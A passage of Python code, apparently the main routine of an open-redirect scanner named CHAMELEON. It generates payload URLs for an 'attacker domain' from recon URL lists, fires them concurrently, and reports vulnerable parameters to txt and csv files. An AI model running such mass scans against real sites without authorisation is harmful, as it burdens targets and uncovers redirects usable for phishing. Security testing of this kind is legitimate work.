    print(f"[*] Mode: {'ALL PARAMS (aggressive)' if args.all_params else 'SMART (redirect-like params only)'}")
    print(f"[*] Payload set: {'EXTENDED (core + HTML injection + internal-IP + unicode)' if args.extended else 'CORE (~250 payloads)'}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Verbose: {'ON (every request shown live)' if args.verbose else 'OFF (use -v to see every in-flight request)'}\n")

    # Build all test cases. Printing progress here too, since on a huge
    # recon dump with --all-params this loop itself can take a while
    # before the first network request is even sent.
    print("[*] Building test URLs ...")
    jobs = []
    for i, url in enumerate(urls, 1):
        for test_url, param, payload in build_payload_urls(
            url, args.domain, all_params=args.all_params, extended=args.extended
        ):
            jobs.append((test_url, param, payload))
        if i % 100 == 0:
            print(f"    [build {i}/{len(urls)}] {len(jobs)} test URLs generated so far ...")

    print(f"\n[*] Total test requests to send: {len(jobs)}")
    if len(jobs) > 20000:
        print(f"{Fore.YELLOW}[!] That's a LOT of requests - this may take a while. "
              f"Consider --max-urls / a smaller list, or skip --all-params/--extended "
              f"if you didn't mean to use them.{Style.RESET_ALL}")
    print()

    results = []
    vulnerable_count = 0
    completed_count = 0
    total_jobs = len(jobs)
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(check_url, test_url, param, payload, args.domain, args.timeout, args.verbose): (test_url, param)
            for test_url, param, payload in jobs
        }
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            results.append(result)
            completed_count += 1

            if result["vulnerable"]:
                vulnerable_count += 1
                with print_lock:
                    print(f"{Fore.RED}{Style.BRIGHT}[VULNERABLE]{Style.RESET_ALL} "
                          f"param={result['param']} -> {result['url']}\n"
                          f"            Location: {result['location']}\n")
            elif args.verbose:
                status = result["status"]
                with print_lock:
                    print(f"{Fore.GREEN}[safe]{Style.RESET_ALL} [{status}] param={result['param']} -> {result['url'][:90]}")

            # Live progress heartbeat - always shown (even without -v), so
            # the tool never looks frozen on a big scan. Shows elapsed time
            # and a rough ETA based on average time-per-request so far.
            if completed_count % args.progress_every == 0 or completed_count == total_jobs:
                elapsed = time.time() - start_time
                rate = completed_count / elapsed if elapsed > 0 else 0
                remaining = (total_jobs - completed_count) / rate if rate > 0 else 0
                pct = (completed_count / total_jobs) * 100 if total_jobs else 100
                with print_lock:
                    print(f"{Fore.CYAN}[progress]{Style.RESET_ALL} "
                          f"{completed_count}/{total_jobs} ({pct:.1f}%) | "
                          f"vulnerable so far: {vulnerable_count} | "
                          f"elapsed: {elapsed:.0f}s | ETA: {remaining:.0f}s")

    # ---------------- Save output files ----------------
    txt_path = f"{args.output}.txt"
    csv_path = f"{args.output}.csv"

    with open(txt_path, "w") as f:
        f.write("CHAMELEON - Open Redirect Scan Results\n")
        f.write(f"Attacker domain used: {args.domain}\n")
        f.write(f"Total requests: {len(results)} | Vulnerable found: {vulnerable_count}\n")
        f.write("=" * 70 + "\n\n")
        for r in results:
            if r["vulnerable"]:
                f.write(f"[VULNERABLE] param={r['param']}\n")
                f.write(f"  URL       : {r['url']}\n")
                f.write(f"  Status    : {r['status']}\n")
                f.write(f"  Location  : {r['location']}\n\n")

    with open(csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["url", "param", "payload", "status", "location", "vulnerable"])
        writer.writeheader()
        writer.writerows(results)

    print("\n" + "=" * 60)
    print(f"[+] Scan complete.")
    print(f"[+] Total requests sent : {len(results)}")
    print(f"[+] Vulnerable found    : {vulnerable_count}")
    print(f"[+] Full report (txt)   : {txt_path}")
    print(f"[+] Full report (csv)   : {csv_path}")
    print("=" * 60)


if __name__ == "__main__":
    main()
